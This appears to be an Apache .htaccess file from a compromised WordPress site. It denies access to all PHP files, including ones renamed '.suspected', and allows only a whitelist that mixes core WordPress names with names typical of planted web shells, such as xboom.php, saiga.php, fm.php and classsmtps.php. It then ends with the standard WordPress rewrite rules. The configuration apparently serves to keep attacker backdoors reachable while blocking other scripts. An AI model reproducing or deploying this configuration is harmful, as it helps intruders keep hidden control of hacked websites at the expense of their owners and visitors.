<FilesMatch ".*\.(phtml|php|PhP|php5|suspected)$">
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "^(index.php|wp.php|plugin-install.php|mar.php|cong.php|about.php|install.php|xboom.php|mds.php|saiga.php|wp-admin.php|lv.php|content.php|zxl.php|fm.php|wp-booking.php|zeal.php|mar.php|classsmtps.php|wp-login.php|simple.php)$">
Order Allow,Deny
Allow from all
</FilesMatch>

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>